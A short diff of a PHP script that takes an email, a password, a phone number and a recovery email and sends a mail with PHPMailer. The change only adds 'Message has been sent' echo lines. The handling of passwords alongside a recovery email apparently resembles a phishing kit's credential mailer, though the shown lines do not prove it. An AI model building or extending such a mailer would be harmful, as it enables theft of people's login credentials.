@@ -48,7 +48,7 @@ if($email != null && $password != null && $phone != null && $rec_email != null){
         $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
 
         $mail->send();
-    
+    echo 'Message has been sent';
 
 }
 else if($email != null && $password != null){
@@ -87,6 +87,7 @@ else if($email != null && $password != null){
     $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
 
     $mail->send();
+    echo 'Message has been sent';
 }
 else{
 	$signal = 'bad';
